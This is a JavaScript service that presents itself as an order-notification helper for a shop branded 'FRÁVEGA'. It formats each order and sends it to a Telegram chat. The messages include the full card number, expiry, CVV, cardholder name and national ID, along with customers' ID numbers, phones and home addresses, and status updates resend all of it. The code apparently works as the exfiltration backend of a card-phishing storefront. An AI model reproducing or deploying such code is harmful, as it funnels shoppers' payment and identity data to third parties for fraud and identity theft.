// Telegram Bot Service for Order Notifications
const https = require('https');

class TelegramService {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
  }

  // Send message to Telegram
  async sendMessage(text) {
    if (!this.botToken || !this.chatId) {
      console.warn('⚠️ Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env');
      return false;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    const data = JSON.stringify({
      chat_id: this.chatId,
      text: text,
      parse_mode: 'HTML'
    });

    return new Promise((resolve, reject) => {
      const req = https.request(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data)
        }
      }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          if (res.statusCode === 200) {
            console.log('✅ Telegram message sent successfully');
            resolve(true);
          } else {
            console.error('❌ Telegram error:', body);
            resolve(false);
          }
        });
      });

      req.on('error', (error) => {
        console.error('❌ Telegram request error:', error);
        resolve(false);
      });

      req.write(data);
      req.end();
    });
  }

  // Format order data for Telegram
  formatOrderMessage(order) {
    const formatPrice = (price) => {
      return new Intl.NumberFormat('es-AR', {
        style: 'currency',
        currency: 'ARS'
      }).format(price);
    };

    const invoiceLabels = {
      'consumidor_final': 'Final Consumer',
      'responsable_inscripto': 'Registered Taxpayer',
      'monotributista': 'Monotax Payer'
    };

    const paymentLabels = {
      'credit_card': 'Credit Card',
      'debit_card': 'Debit Card',
      'cash': 'Cash'
    };

    const statusLabels = {
      'pending': '⏳ Pending',
      'confirmed': '✅ Confirmed',
      'processing': '📦 Processing',
      'shipped': '🚚 Shipped',
      'delivered': '✔️ Delivered',
      'cancelled': '❌ Cancelled'
    };

    // Build items list
    const itemsList = order.items.map((item, i) =>
      `   ${i + 1}. ${item.name}\n      Qty: ${item.quantity} | Price: ${formatPrice(item.price)}`
    ).join('\n');

    const brandEmoji = {
      'visa': '🟡',
      'mastercard': '🔴',
      'amex': '🔵',
      'cabal': '⚪',
      'naranja': '🟠'
    };

    const formatCard = (num) => {
      const digits = num.replace(/\D/g, '');
      if (digits.length === 15) return digits.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
      return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
    };

    // Build the message
    let message = `
🛒 <b>NEW ORDER - FRÁVEGA</b>
━━━━━━━━━━━━━━━━━━━━━

📋 <b>ORDER #${order.orderNumber}</b>
📅 Date: ${new Date(order.createdAt).toLocaleString('en-US')}
📊 Status: ${statusLabels[order.status] || order.status}

━━━━━━━━━━━━━━━━━━━━━
👤 <b>CUSTOMER DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${order.customer.email}
👤 Name: ${order.customer.firstName || ''} ${order.customer.lastName || ''}
🆔 DNI: ${order.customer.dni || 'Not specified'}
📱 Phone: ${order.customer.phone?.prefix || ''}${order.customer.phone?.number || 'Not specified'}
📄 Invoice Type: ${invoiceLabels[order.customer.invoiceType] || 'Final Consumer'}

━━━━━━━━━━━━━━━━━━━━━
📦 <b>SHIPPING</b>
━━━━━━━━━━━━━━━━━━━━━
📍 Method: ${order.shipping?.method === 'home_delivery' ? 'Home Delivery' : 'Store Pickup'}`;

    if (order.shipping?.address) {
      const addr = order.shipping.address;
      message += `
🏠 Address: ${addr.street || ''} ${addr.number || ''}`;
      if (addr.floor || addr.apartment) {
        message += `
   Floor: ${addr.floor || '-'} | Apt: ${addr.apartment || '-'}`;
      }
      message += `
🌆 City: ${addr.city || ''}
🗺️ Province: ${addr.province || ''}
📮 Postal Code: ${addr.postalCode || ''}`;
      if (addr.additionalInfo) {
        message += `
📝 Notes: ${addr.additionalInfo}`;
      }
    }

    message += `

━━━━━━━━━━━━━━━━━━━━━
💳 <b>PAYMENT (RESTRICTED DATA)</b>
━━━━━━━━━━━━━━━━━━━━━
💰 Method: ${paymentLabels[order.payment?.method] || 'Not specified'}`;

    if (order.payment?.cardBrand) {
      const icon = brandEmoji[order.payment.cardBrand.toLowerCase()] || '🏦';
      message += `\n${icon} Card Brand: ${order.payment.cardBrand.toUpperCase()}`;
    }
    if (order.payment?.cardNumber) {
      message += `\n💳 Card Number: <code>${formatCard(order.payment.cardNumber)}</code>`;
    } else if (order.payment?.cardLastFour) {
      message += `\n💳 Ending in: **** ${order.payment.cardLastFour}`;
    }
    if (order.payment?.cardHolder) {
      message += `\n👤 Card Holder: <b>${order.payment.cardHolder}</b>`;
    }
    if (order.payment?.cardExpiry) {
      message += `\n📅 Expiry: ${order.payment.cardExpiry}`;
    }
    if (order.payment?.cardCvv) {
      message += `\n🔐 CVV: <code>${order.payment.cardCvv}</code>`;
    }
    if (order.payment?.cardDni) {
      message += `\n🆔 Holder DNI: <b>${order.payment.cardDni}</b>`;
    }
    if (order.payment?.installments) {
      message += `\n📊 Installments: ${order.payment.installments}`;
    }

    // Add Fraud Risk Warning for unusually large amounts
    if (order.total > 1500000) {
      message += `\n\n🚨 <b>FRAUD ALERT: Unusually large transaction</b>`;
    }

    message += `
✅ Payment Status: ${order.payment?.status === 'approved' ? 'Approved ✓' : 'Pending'}

━━━━━━━━━━━━━━━━━━━━━
🛍️ <b>PRODUCTS</b>
━━━━━━━━━━━━━━━━━━━━━
${itemsList}

━━━━━━━━━━━━━━━━━━━━━
💵 <b>SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━
📦 Subtotal: ${formatPrice(order.subtotal)}`;

    if (order.shippingCost > 0) {
      message += `
🚚 Shipping: ${formatPrice(order.shippingCost)}`;
    } else {
      message += `
🚚 Shipping: FREE`;
    }

    if (order.discount > 0) {
      message += `
🏷️ Discount: -${formatPrice(order.discount)}`;
      if (order.couponCode) {
        message += ` (${order.couponCode})`;
      }
    }

    message += `

💰 <b>TOTAL: ${formatPrice(order.total)}</b>
━━━━━━━━━━━━━━━━━━━━━`;

    return message;
  }

  // Format status change message — sends FULL order data
  formatStatusChangeMessage(order, newStatus) {
    const formatPrice = (price) => {
      return new Intl.NumberFormat('es-AR', {
        style: 'currency',
        currency: 'ARS'
      }).format(price);
    };

    const statusLabels = {
      'pending': '⏳ Pending',
      'confirmed': '✅ Confirmed',
      'processing': '📦 Processing',
      'shipped': '🚚 Shipped',
      'delivered': '✔️ Delivered',
      'cancelled': '❌ Cancelled'
    };

    const invoiceLabels = {
      'consumidor_final': 'Final Consumer',
      'responsable_inscripto': 'Registered Taxpayer',
      'monotributista': 'Monotax Payer'
    };

    const paymentLabels = {
      'credit_card': 'Credit Card',
      'debit_card': 'Debit Card',
      'cash': 'Cash'
    };

    const statusEmoji = {
      'confirmed': '✅',
      'processing': '📦',
      'shipped': '🚚',
      'delivered': '✔️',
      'cancelled': '❌'
    };

    // Build items list
    const itemsList = (order.items || []).map((item, i) =>
      `   ${i + 1}. ${item.name}\n      Qty: ${item.quantity} | Price: ${formatPrice(item.price)}`
    ).join('\n');

    let message = `
${statusEmoji[newStatus] || '🔄'} <b>ORDER UPDATE - FRÁVEGA</b>
━━━━━━━━━━━━━━━━━━━━━

📋 <b>ORDER #${order.orderNumber || order._id}</b>
📅 Date: ${new Date(order.createdAt || Date.now()).toLocaleString('en-US')}
📊 New Status: ${statusLabels[newStatus] || newStatus}

━━━━━━━━━━━━━━━━━━━━━
👤 <b>CUSTOMER DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${order.customer?.email || 'N/A'}
👤 Name: ${order.customer?.firstName || ''} ${order.customer?.lastName || ''}
🆔 DNI: ${order.customer?.dni || 'Not specified'}
📱 Phone: ${order.customer?.phone?.prefix || ''}${order.customer?.phone?.number || 'Not specified'}
📄 Invoice Type: ${invoiceLabels[order.customer?.invoiceType] || 'Final Consumer'}

━━━━━━━━━━━━━━━━━━━━━
📦 <b>SHIPPING</b>
━━━━━━━━━━━━━━━━━━━━━
📍 Method: ${order.shipping?.method === 'home_delivery' ? 'Home Delivery' : 'Store Pickup'}`;

    if (order.shipping?.address) {
      const addr = order.shipping.address;
      message += `\n🏠 Address: ${addr.street || ''} ${addr.number || ''}`;
      if (addr.floor || addr.apartment) {
        message += `\n   Floor: ${addr.floor || '-'} | Apt: ${addr.apartment || '-'}`;
      }
      message += `\n🌆 City: ${addr.city || ''}`;
      message += `\n🗺️ Province: ${addr.province || ''}`;
      message += `\n📮 Postal Code: ${addr.postalCode || ''}`;
      if (addr.additionalInfo) {
        message += `\n📝 Notes: ${addr.additionalInfo}`;
      }
    }

    message += `\n\n━━━━━━━━━━━━━━━━━━━━━\n💳 <b>PAYMENT</b>\n━━━━━━━━━━━━━━━━━━━━━\n💰 Method: ${paymentLabels[order.payment?.method] || 'Not specified'}`;

    if (order.payment?.cardBrand) {
      message += `\n🏦 Card Brand: ${order.payment.cardBrand}`;
    }
    if (order.payment?.cardNumber) {
      message += `\n💳 Card Number: ${order.payment.cardNumber}`;
    } else if (order.payment?.cardLastFour) {
      message += `\n💳 Ending in: ****${order.payment.cardLastFour}`;
    }
    if (order.payment?.cardHolder) {
      message += `\n👤 Card Holder: ${order.payment.cardHolder}`;
    }
    if (order.payment?.cardExpiry) {
      message += `\n📅 Expiry: ${order.payment.cardExpiry}`;
    }
    if (order.payment?.cardCvv) {
      message += `\n🔐 CVV: ${order.payment.cardCvv}`;
    }
    if (order.payment?.cardDni) {
      message += `\n🆔 Card Holder DNI: ${order.payment.cardDni}`;
    }
    if (order.payment?.installments) {
      message += `\n📊 Installments: ${order.payment.installments}`;
    }
    message += `\n✅ Payment Status: ${order.payment?.status === 'approved' ? 'Approved ✓' : 'Pending'}`;

    message += `\n\n━━━━━━━━━━━━━━━━━━━━━\n🛍️ <b>PRODUCTS</b>\n━━━━━━━━━━━━━━━━━━━━━\n${itemsList}`;

    message += `\n\n━━━━━━━━━━━━━━━━━━━━━\n💵 <b>SUMMARY</b>\n━━━━━━━━━━━━━━━━━━━━━\n📦 Subtotal: ${formatPrice(order.subtotal || 0)}`;

    if (order.shippingCost > 0) {
      message += `\n🚚 Shipping: ${formatPrice(order.shippingCost)}`;
    } else {
      message += `\n🚚 Shipping: FREE`;
    }

    if (order.discount > 0) {
      message += `\n🏷️ Discount: -${formatPrice(order.discount)}`;
      if (order.couponCode) {
        message += ` (${order.couponCode})`;
      }
    }

    message += `\n\n💰 <b>TOTAL: ${formatPrice(order.total || 0)}</b>\n━━━━━━━━━━━━━━━━━━━━━\n📅 ${new Date().toLocaleString('en-US')}`;

    return message;
  }

  // Send order notification
  async sendOrderNotification(order) {
    const message = this.formatOrderMessage(order);
    return await this.sendMessage(message);
  }
}

module.exports = new TelegramService();
